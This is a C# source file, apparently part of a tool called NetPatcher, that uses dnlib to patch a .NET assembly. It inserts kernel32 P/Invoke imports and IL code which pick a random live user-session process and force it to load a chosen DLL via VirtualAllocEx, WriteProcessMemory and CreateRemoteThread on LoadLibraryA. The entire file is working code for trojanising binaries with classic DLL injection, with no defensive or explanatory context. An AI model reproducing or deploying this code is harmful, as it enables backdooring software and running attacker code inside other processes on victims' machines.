using System;
using System.Diagnostics;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace NetPatcher
{
	internal partial class DllInjectionPatcher : Program
	{
		private readonly ModuleDef module;
		private readonly string dllPath;

		public MethodDef EntryPointMethod { get; private set; }

		public DllInjectionPatcher(ModuleDef module, string dllPath)
		{
			this.module = module;
			this.dllPath = dllPath;
		}

		public void Inject()
		{
			var typeDef = module.GlobalType;
			var corlib = module.CorLibTypes;

			var openProcess = InjectPInvoke(typeDef, "OpenProcess", MethodSig.CreateStatic(corlib.IntPtr, corlib.Int32, corlib.Boolean, corlib.Int32));
			var virtualAllocEx = InjectPInvoke(typeDef, "VirtualAllocEx", MethodSig.CreateStatic(corlib.IntPtr, corlib.IntPtr, corlib.IntPtr, corlib.UInt32, corlib.UInt32, corlib.UInt32));
			var writeProcessMemory = InjectPInvoke(typeDef, "WriteProcessMemory", MethodSig.CreateStatic(corlib.Boolean, corlib.IntPtr, corlib.IntPtr, new SZArraySig(corlib.Byte), corlib.UInt32, new ByRefSig(corlib.UIntPtr)));
			var getModuleHandle = InjectPInvoke(typeDef, "GetModuleHandleA", MethodSig.CreateStatic(corlib.IntPtr, corlib.String));
			var getProcAddress = InjectPInvoke(typeDef, "GetProcAddress", MethodSig.CreateStatic(corlib.IntPtr, corlib.IntPtr, corlib.String));
			var createRemoteThread = InjectPInvoke(typeDef, "CreateRemoteThread", MethodSig.CreateStatic(corlib.IntPtr, corlib.IntPtr, corlib.IntPtr, corlib.UInt32, corlib.IntPtr, corlib.IntPtr, corlib.UInt32, corlib.IntPtr));

			var injectDllIntoProcess = CreateInjectDllIntoProcess(typeDef, corlib, openProcess, virtualAllocEx, writeProcessMemory, getModuleHandle, getProcAddress, createRemoteThread);
			typeDef.Methods.Add(injectDllIntoProcess);

			EntryPointMethod = new MethodDefUser(
				"InjectDll",
				MethodSig.CreateStatic(corlib.Void),
				MethodImplAttributes.IL | MethodImplAttributes.Managed,
				MethodAttributes.Public | MethodAttributes.Static
			);
			typeDef.Methods.Add(EntryPointMethod);

			var inject = EntryPointMethod.Body = new CilBody { InitLocals = true };
			var procType = module.Import(typeof(Process));
			var getProcesses = module.Import(typeof(Process).GetMethod("GetProcesses", Type.EmptyTypes));
			var getId = module.Import(typeof(Process).GetProperty("Id").GetGetMethod());
			var getSessionId = module.Import(typeof(Process).GetProperty("SessionId").GetGetMethod());
			var getHasExited = module.Import(typeof(Process).GetProperty("HasExited").GetGetMethod());
			var getProcessName = module.Import(typeof(Process).GetProperty("ProcessName").GetGetMethod());

			var procs = new Local(new SZArraySig(procType.ToTypeSig()));
			var index = new Local(corlib.Int32);
			var len = new Local(corlib.Int32);
			var rand = new Local(module.ImportAsTypeSig(typeof(Random)));
			var chosen = new Local(procType.ToTypeSig());

			inject.Variables.Add(procs);
			inject.Variables.Add(index);
			inject.Variables.Add(len);
			inject.Variables.Add(rand);
			inject.Variables.Add(chosen);

			var loopStart = Instruction.Create(OpCodes.Br_S, Instruction.Create(OpCodes.Nop));
			var injectEnd = Instruction.Create(OpCodes.Ret);

			inject.Instructions.Add(OpCodes.Call.ToInstruction(getProcesses));
			inject.Instructions.Add(OpCodes.Stloc.ToInstruction(procs));
			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(procs));
			inject.Instructions.Add(OpCodes.Ldlen.ToInstruction());
			inject.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
			inject.Instructions.Add(OpCodes.Stloc.ToInstruction(len));
			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(len));
			inject.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
			inject.Instructions.Add(OpCodes.Ble.ToInstruction(injectEnd));

			inject.Instructions.Add(OpCodes.Newobj.ToInstruction(module.Import(typeof(Random).GetConstructor(Type.EmptyTypes))));
			inject.Instructions.Add(OpCodes.Stloc.ToInstruction(rand));

			var loopLabel = Instruction.Create(OpCodes.Ldloc, rand);
			inject.Instructions.Add(loopStart);
			inject.Instructions.Add(loopLabel);
			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(len));
			inject.Instructions.Add(OpCodes.Callvirt.ToInstruction(module.Import(typeof(Random).GetMethod("Next", new[] { typeof(int) }))));
			inject.Instructions.Add(OpCodes.Stloc.ToInstruction(index));
			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(procs));
			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(index));
			inject.Instructions.Add(OpCodes.Ldelem_Ref.ToInstruction());
			inject.Instructions.Add(OpCodes.Stloc.ToInstruction(chosen));

			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(chosen));
			inject.Instructions.Add(OpCodes.Callvirt.ToInstruction(getHasExited));
			inject.Instructions.Add(OpCodes.Brtrue_S.ToInstruction(loopLabel));

			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(chosen));
			inject.Instructions.Add(OpCodes.Callvirt.ToInstruction(getSessionId));
			inject.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
			inject.Instructions.Add(OpCodes.Ble_S.ToInstruction(loopLabel));

			inject.Instructions.Add(OpCodes.Ldloc.ToInstruction(chosen));
			inject.Instructions.Add(OpCodes.Callvirt.ToInstruction(getId));
			inject.Instructions.Add(OpCodes.Ldstr.ToInstruction(dllPath));
			inject.Instructions.Add(OpCodes.Call.ToInstruction(injectDllIntoProcess));
			inject.Instructions.Add(injectEnd);
		}

		private MethodDef InjectPInvoke(TypeDef typeDef, string name, MethodSig sig)
		{
			var method = new MethodDefUser(name, sig)
			{
				ImplAttributes = MethodImplAttributes.PreserveSig,
				Attributes = MethodAttributes.Static | MethodAttributes.PinvokeImpl | MethodAttributes.Private
			};
			method.ImplMap = new ImplMapUser(
				new ModuleRefUser(module, "kernel32.dll"),
				name,
				PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
			);
			typeDef.Methods.Add(method);
			return method;
		}

		private MethodDef CreateInjectDllIntoProcess(TypeDef typeDef, ICorLibTypes corlib, MethodDef openProcess, MethodDef virtualAllocEx, MethodDef writeProcessMemory, MethodDef getModuleHandle, MethodDef getProcAddress, MethodDef createRemoteThread)
		{
			var method = new MethodDefUser("InjectDllIntoProcess",
				MethodSig.CreateStatic(corlib.Void, corlib.Int32, corlib.String),
				MethodImplAttributes.IL | MethodImplAttributes.Managed,
				MethodAttributes.Private | MethodAttributes.Static);

			var body = method.Body = new CilBody { InitLocals = true };

			var localProcessHandle = new Local(corlib.IntPtr);
			var localAlloc = new Local(corlib.IntPtr);
			var localBytes = new Local(new SZArraySig(corlib.Byte));
			var localWritten = new Local(corlib.UIntPtr);
			var localKernel32 = new Local(corlib.IntPtr);
			var localLoadLibrary = new Local(corlib.IntPtr);
			var localThread = new Local(corlib.IntPtr);

			body.Variables.Add(localProcessHandle);
			body.Variables.Add(localAlloc);
			body.Variables.Add(localBytes);
			body.Variables.Add(localWritten);
			body.Variables.Add(localKernel32);
			body.Variables.Add(localLoadLibrary);
			body.Variables.Add(localThread);

			const int PROCESS_ALL_ACCESS = 0x1F0FFF;
			const uint MEM_COMMIT = 0x1000;
			const uint PAGE_READWRITE = 0x04;

			var encodingType = module.Import(typeof(System.Text.Encoding));
			var getEncoding = module.Import(typeof(System.Text.Encoding).GetProperty("ASCII").GetGetMethod());
			var getBytes = module.Import(typeof(System.Text.Encoding).GetMethod("GetBytes", new[] { typeof(string) }));

			body.Instructions.Add(OpCodes.Ldc_I4.ToInstruction(PROCESS_ALL_ACCESS));
			body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
			body.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
			body.Instructions.Add(OpCodes.Call.ToInstruction(openProcess));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcessHandle));

			body.Instructions.Add(OpCodes.Call.ToInstruction(getEncoding));
			body.Instructions.Add(OpCodes.Ldarg_1.ToInstruction());
			body.Instructions.Add(OpCodes.Ldstr.ToInstruction("\0"));
			body.Instructions.Add(OpCodes.Call.ToInstruction(module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(string) }))));
			body.Instructions.Add(OpCodes.Callvirt.ToInstruction(getBytes));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localBytes));

			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
			body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
			body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
			body.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
			body.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)MEM_COMMIT));
			body.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)PAGE_READWRITE));
			body.Instructions.Add(OpCodes.Call.ToInstruction(virtualAllocEx));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localAlloc));

			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
			body.Instructions.Add(OpCodes.Ldlen.ToInstruction());
			body.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
			body.Instructions.Add(OpCodes.Ldloca_S.ToInstruction(localWritten));
			body.Instructions.Add(OpCodes.Call.ToInstruction(writeProcessMemory));
			body.Instructions.Add(OpCodes.Pop.ToInstruction());

			body.Instructions.Add(OpCodes.Ldstr.ToInstruction("kernel32.dll"));
			body.Instructions.Add(OpCodes.Call.ToInstruction(getModuleHandle));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localKernel32));

			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localKernel32));
			body.Instructions.Add(OpCodes.Ldstr.ToInstruction("LoadLibraryA"));
			body.Instructions.Add(OpCodes.Call.ToInstruction(getProcAddress));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localLoadLibrary));

			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
			body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
			body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
			body.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localLoadLibrary));
			body.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
			body.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
			body.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
			body.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
			body.Instructions.Add(OpCodes.Call.ToInstruction(createRemoteThread));
			body.Instructions.Add(OpCodes.Stloc.ToInstruction(localThread));

			body.Instructions.Add(OpCodes.Ret.ToInstruction());
			return method;
		}
	}
}
